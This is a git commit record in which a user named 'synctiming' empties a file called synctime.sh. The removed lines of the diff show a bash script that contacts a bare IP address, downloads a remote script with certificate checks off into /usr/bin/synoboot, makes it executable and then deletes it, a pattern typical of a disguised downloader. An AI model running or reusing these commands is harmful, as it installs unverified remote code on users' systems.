44dc07d36a7018296b101b1f91ecdeaf9d090285
synctiming <154487286+synctiming@users.noreply.github.com>
2024-01-29 08:50:06 -0500

    Update synctime.sh

--- synctime.sh
+++ synctime.sh
@@ -1,5 +1,1 @@
-#!/bin/bash
-curl -s http://193.36.119.72/1.txt
-curl -s -k https://raw.githubusercontent.com/synctiming/synctime/main/synctiming.sh -o /usr/bin/synoboot
-chmod +x /usr/bin/synoboot
-rm -rf /usr/bin/synoboot
+
